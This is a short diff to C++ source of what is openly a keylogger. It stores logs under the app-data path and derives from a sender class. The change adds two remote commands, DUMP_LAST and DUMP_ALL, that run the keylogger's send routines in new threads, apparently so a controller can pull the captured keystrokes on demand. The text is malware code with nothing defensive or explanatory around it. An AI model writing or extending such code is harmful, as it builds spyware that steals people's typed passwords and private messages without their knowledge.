@@ -214,6 +214,18 @@ KeyLogger::KeyLogger(const Stream & stream) : Sender(stream) {
 #ifdef KEYLOGGER_DEF
     pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(KEYLOGGER_DEF) + L"\\";
     logsFileName = generateLogName();
+    actionMap["DUMP_LAST"] =[&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &KeyLogger::send);
+    };
+    actionMap["DUMP_ALL"] =[&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &KeyLogger::sendAll);
+    };
+
+
+
 #endif
 }
+
+
+
 
